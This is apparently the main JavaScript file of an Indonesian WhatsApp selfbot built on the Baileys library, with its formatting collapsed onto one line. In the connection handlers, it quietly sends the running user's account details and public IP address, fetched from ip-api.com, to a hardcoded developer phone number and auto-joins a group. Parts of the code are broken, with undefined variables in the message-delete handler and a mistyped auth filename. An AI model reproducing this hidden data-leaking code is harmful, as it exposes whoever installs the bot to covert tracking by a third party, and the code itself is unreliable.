const { WAConnection: _WAConnection, Browsers, MessageType } = require('@adiwajshing/baileys')const ikyy = require('./lib/simple.js')const WAConnection = ikyy.WAConnection(_WAConnection)const  { Functions } = require('./lib/functions.js');const { color, bgcolor } = require('./lib/color')const fs = require("fs-extra")const { version, bugs } = require('./package.json')const { banner, start, success, getGroupAdmins } = require("./lib/functionsss");const fetch = require("node-fetch");const sleep = async (ms) => {    return new Promise(resolve => setTimeout(resolve, ms));} const figlet = require('figlet')const { uncache, nocache } = require('./lib/loader')const setting = JSON.parse(fs.readFileSync('./setting.json'))const welcome = require('./message/group')baterai = 'unknown'charging = 'unknown'//const moment = require("moment-timezone")     const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')        if(time2 < "23:59:00"){        var ucapanWaktu = 'Selamat Malam'}        if(time2 < "19:00:00"){        var ucapanWaktu = 'Selamat Petang'}        if(time2 < "18:00:00"){        var ucapanWaktu = 'Selamat Sore'}        if(time2 < "15:00:00"){        var ucapanWaktu = 'Selamat Siang'}        if(time2 < "11:00:00"){        var ucapanWaktu = 'Selamat Pagi'}        if(time2 < "05:00:00"){        var ucapanWaktu = 'Selamat Malam'}const ownerName = setting.ownerNamespc1 = '         'spc2 = '\n                       'spc3 = '                   'spc4 = '               'spc5= '      '//nocacheglobal.media = require('./src/json/media.json');global.functions = new Functions();global.logo = { buffer:functions.fs.readFileSync('./src/images/logo.jpg'),message:media.logo };require('./iky.js')nocache('../iky.js', module => console.log(color('[WATCH]', 'yellow'), color(`'${module}'`, 'cyan'), 'File is updated!'))require('./message/group.js')nocache('../message/group.js', module => console.log(color('[WATCH]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))const starts = async (ikyy = new WAConnection()) => {  ikyy.logger.level = "warn";  ikyy.version = [2, 2140, 12];  ikyy.browserDescription = ["hehe boy", "Chrome", "3.0"];  console.log(banner.string);  ikyy.on("qr", () => {    console.log(      color("[", "white"),      color("!", "blue"),      color("]", "white"),      color(" Scan bang"),      ikyy.sendMessage(`6289636634511@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Berhasil Terhubung!_`, MessageType.extendedText)              );  });  fs.existsSync("./BOT.json") && ikyy.loadAuthInfo("./BOT.json");  ikyy.on("connecting", () => {    start("2", "Connecting...");  });  ikyy.on("open", () => {    success("2", "Connect Sukses > Follow @_ItsMeVall");console.log(color(figlet.textSync(`${spc1}            SelfBot`, {font: 'Standard',horizontalLayout: 'default',vertivalLayout: 'default',width: 80,whitespaceBreak: false}), 'cyan'))console.log(color(`${spc2}[ • CREATOR BOT ${ownerName} • ]` ,'cyan'))console.log(color(`${spc4}< ================================================== >`, 'cyan'))console.log(color(`${spc3}[•]`, 'aqua'), color(`Hai        : ${ucapanWaktu}`, 'white'))console.log(color(`${spc3}[•]`, 'aqua'), color(`Bot Version : 2.1.2`, 'white'))console.log(color(`${spc3}[•]`, 'aqua'), color(`Status      : Online!`, 'white'))console.log(color(`${spc3}[•]`, 'aqua'), color(`Owner       : ${ownerName}`, 'white'))console.log(color(`${spc4}< ================================================== >`, 'cyan'))    console.log(color('⎇','red'), color('𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗚𝘄 𝗦𝘂𝘀𝘂𝗻 𝗦𝗲𝗻𝗱𝗶𝗿𝗶!\n𝗡𝗼𝘁𝗲: 𝗝𝗮𝗻𝗴𝗮𝗻 𝗟𝘂𝗽𝗮 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲 𝗜𝘁𝘀𝗠𝗲𝗩𝗮𝗹𝗹 シ︎', 'yellow'))    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/6289636634511'))    console.log(color('[SELF-BOT]'), color('𝗦𝗲𝗹𝗳𝗯𝗼𝘁 𝗜𝘁𝘀𝗠𝗲𝗩𝗮𝗹𝗹 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))    console.log(color('[DEV]', 'cyan'), color('𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗕𝗮𝗰𝗸, 𝗢𝘄𝗻𝗲𝗿! 𝗛𝗼𝗽𝗲 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗗𝗼𝗶𝗻𝗴 𝗪𝗲𝗹𝗹~', 'magenta'))    console.log(color('⎇','green'), color('𝗠𝗮𝗸𝗮𝘀𝗶𝗵 𝗗𝗵 𝗣𝗮𝗸𝗲', 'white'))  });await ikyy.connect({ timeoutMs: 30 * 1000 });  fs.writeFileSync(`./BOT.json.json`, JSON.stringify(ikyy.base64EncodedAuthInfo(), null, '\t')) teks = `C` ikyy.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]}) console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan')) ikyy.sendMessage(`6289636634511@s.whatsapp.net`, `*Hai Owner Rival, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(ikyy.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Zexy Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./connect.jpg'),sourceUrl:"https://wa.me/6289636634511?text=Assalamualaikum"}}})	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))fetch(`http://ip-api.com/line`).then(res => res.text())          .then(bu =>{       ikyy.sendMessage("6289636634511@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Zexy Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./connect.jpg'),sourceUrl:"https://wa.me/6289636634511?text=Assalamualaikum"}}})     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))   })          ikyy.on('connecting', () => {		console.log(color('|TRM|'), color('Connecting...', 'cyan'))		})		ikyy.on('open', () => {	console.log(color('|TRM|'), color('Connected', 'cyan'))	})          ikyy.on('ws-close', () => {        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))        })        ikyy.on('close', async () => {        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))        })	// Baterai	ikyy.on('CB:action,,battery', json => {		global.batteryLevelStr = json[2][0][1].value		global.batterylevel = parseInt(batteryLevelStr)		baterai = batterylevel		if (json[2][0][1].live == 'true') charging = true		if (json[2][0][1].live == 'false') charging = false		console.log(json[2][0][1])		console.log('Baterai : ' + batterylevel + '%')	})	global.batrei = global.batrei ? global.batrei : []	ikyy.on('CB:action,,battery', json => {		const batteryLevelStr = json[2][0][1].value		const batterylevel = parseInt(batteryLevelStr)		global.batrei.push(batterylevel)	})// anticallikyy.on('CB:action,,call', async json => {    const callerId = json[2][0][1].from;    console.log("call dari "+ callerId)        ikyy.sendMessage(callerId, "telpon = block, hubungi owner jika ingin di buka", MessageType.text)        await sleep(4000)        await ikyy.blockUser(callerId, "add") // Block user})//	// welcome	ikyy.on('group-participants-update', async (anu) => {		await welcome(ikyy, anu)	})    ikyy.on("message-delete", async (m) => {    if (m.key.remoteJid == "status@broadcast") return;    if (!m.key.fromMe && m.key.fromMe) return;    m.message =      Object.keys(m.message)[0] === "ephemeralMessage"        ? m.message.ephemeralMessage.message        : m.message;    const antidel = JSON.parse(fs.readFileSync("./database/antidelete.json"));    const isGroup = m.key.remoteJid.endsWith("@g.us")    const isAntidel = isGroup ? antidel.includes(m.key.remoteJid) : false;    const isCmd = isCmdd   if (isCmd) cmdadd()      const { msgFilter } = require('./lib/antispam')        const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd    const moment = require("moment-timezone");    const jam = moment.tz("Asia/Jakarta").format("HH:mm:ss");    let d = new Date();    let locale = "id";    let gmt = new Date(0).getTime() - new Date("1 Januari 2021").getTime();    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][      Math.floor((d * 1 + gmt) / 84600000) % 5    ];    let week = d.toLocaleDateString(locale, { weekday: "long" });    let calender = d.toLocaleDateString(locale, {      day: "numeric",      month: "long",      year: "numeric",    });         //antispam        if (isCmd && msgFilter.isFilteyellow(from) && !isGroup) {        console.log(color('[SPAM]', 'yellow'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))        return reply('「 ❗ 」Sabar Bang 5 Detik/Command')}                if (isCmd && msgFilter.isFilteyellow(from) && isGroup) {        console.log(color('[SPAM]', 'yellow'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))        return reply('「 ❗ 」Sabar Bang 5 Detik/Command')        }    const type = Object.keys(m.message)[0];    if (!isAntidel) return    ikyy.sendMessage(      m.key.remoteJid,      `\`\`\`「 Anti Delete 」\`\`\`  •> Nama : @${m.participant.split("@")[0]}  •> Waktu : ${jam} ${week} ${calender}  •> Type : ${type}`,      MessageType.text,      { quoted: m.message, contextInfo: { mentionedJid: [m.participant] } }    );    ikyy.copyNForward(m.key.remoteJid, m.message);  });  	ikyy.on('chat-update', async (message) => {		require('./iky.js')(ikyy, message)	})}starts()